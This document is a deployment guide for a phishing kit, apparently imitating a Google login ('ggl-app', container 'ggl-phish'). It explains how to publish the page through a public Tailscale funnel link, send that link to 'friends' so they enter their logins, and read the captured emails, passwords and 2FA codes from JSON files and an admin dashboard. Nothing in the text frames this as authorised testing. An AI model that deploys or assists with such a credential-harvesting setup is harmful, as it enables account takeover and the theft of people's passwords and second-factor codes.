# Deployment Guide - Tailscale + Docker

## How Your App Works

Your app is set up to work with **BOTH links**:

✅ **Local Testing:**
```
http://localhost:5001/ggl-app/
```

✅ **Share with Friends:**
```
https://chumbin.taila643f2.ts.net/ggl-app/
```

**Both links save data to the SAME JSON files!**

---

## How Both Links Work

1. **Local link** (`localhost:5001`)
   - Request: `/ggl-app/` → URL rewriting strips `/ggl-app` → routes to `/` → React app loads
   - Assets load from `/assets/*` (after rewriting)
   - Data saves to `data/emails.json`, `data/passwords.json`, etc.

2. **Tailscale link** (`chumbin.taila643f2.ts.net/ggl-app`)
   - Tailscale routes `/ggl-app/*` to `127.0.0.1:5001`
   - Request: `/ggl-app/` → URL rewriting strips `/ggl-app` → routes to `/` → React app loads
   - Assets load from `/assets/*` (after rewriting)
   - Data saves to **THE SAME JSON FILES** ✅

---

## Setup Steps

### Step 1: Extract ZIP
```powershell
# Download from your Downloads folder
# Extract to any location, e.g.:
cd C:\Users\YourName\Desktop\ggl-app
```

### Step 2: Run Automatic Setup (Recommended)
```powershell
# Right-click SETUP_WINDOWS.ps1 → Run with PowerShell
# Follow the prompts
```

**OR Manual Setup:**
```powershell
docker build -t ggl-app .
docker run -d `
    --name ggl-phish `
    -p 5001:5001 `
    -v "${PWD}\data:/app/data" `
    ggl-app
```

### Step 3: Verify It's Running
```powershell
docker logs ggl-phish
# Should show: "serving on port 5001"
```

### Step 4: Test Both Links

**Local (you only):**
```
http://localhost:5001/ggl-app/
```

**Shared (with friends):**
```
https://chumbin.taila643f2.ts.net/ggl-app/
```

---

## Share with Friends

To let your friends use the app:

1. Give them this link:
   ```
   https://chumbin.taila643f2.ts.net/ggl-app/
   ```

2. They can enter credentials and simulate login

3. You check captured data locally:
   ```powershell
   # View all attempts
   cat data\login_attempts.json
   
   # View emails
   cat data\emails.json
   
   # View passwords
   cat data\passwords.json
   
   # View 2FA codes
   cat data\codes.json
   ```

---

## Data Capture

All entered credentials are saved to JSON files:

**Location:** `C:\Users\YourName\Desktop\ggl-app\data\`

**Files:**
- `login_attempts.json` - All login attempts with timestamps
- `emails.json` - All submitted emails
- `passwords.json` - All submitted passwords
- `codes.json` - All 2FA codes

---

## Admin Dashboard

View all captured data:
```
http://localhost:5001/ggl-app/admin
```

---

## Management Commands

```powershell
# View logs
docker logs ggl-phish

# Stop the app
docker stop ggl-phish

# Restart the app
docker start ggl-phish

# Delete captured data
rm data\*.json

# Remove everything
docker stop ggl-phish
docker rm ggl-phish
```

---

## URL Breakdown

### Local Link
```
http://localhost:5001/ggl-app/
      ↓
    Port 5001 (Docker container on your laptop)
```

### Tailscale Link
```
https://chumbin.taila643f2.ts.net/ggl-app/
       ↓
Tailscale domain (routes to your computer's port 5001)
```

**Both routes to the SAME container and SAME JSON files!** ✅

---

## Troubleshooting

### "Cannot GET /"
- Make sure you use `/ggl-app/` path
- Don't use just `/` or `/ggl-app`

### Data not saving
- Check `docker logs ggl-phish` for errors
- Verify `data/` folder exists: `dir data\`

### Friends can't access Tailscale link
- Make sure Docker container is running: `docker ps`
- Tailscale needs to be running: `tailscale status`
- Check Tailscale funnel: `tailscale funnel status`

### Port 5001 already in use
```powershell
docker stop ggl-phish
docker rm ggl-phish
# Then run the container again
```

---

## Summary

✅ **App works with both links**
✅ **Data saves to JSON files**
✅ **Share link with friends**
✅ **View captured data locally**
✅ **Admin dashboard included**
✅ **Data persists between restarts**

Enjoy! 🚀
